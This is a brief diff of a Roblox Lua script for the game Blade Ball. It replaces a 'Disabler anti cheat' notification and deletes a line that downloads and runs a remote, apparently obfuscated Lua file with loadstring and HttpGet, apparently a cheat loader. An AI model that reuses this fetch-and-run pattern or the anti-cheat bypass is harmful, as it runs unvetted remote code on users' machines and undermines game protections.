@@ -1,7 +1,5 @@
 game:GetService("StarterGui"):SetCore("SendNotification",{
-	Title = "Blade ball load", -- Required
-	Text = "Disabler anti cheat", -- Required
+	Title = "sorry", -- Required
+	Text = "BRUH", -- Required
 	Icon = "rbxassetid://1404188196" -- Optional
 })
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/yieviro92creepy/fucku/main/Protected_8196366850045643.lua.txt'))()
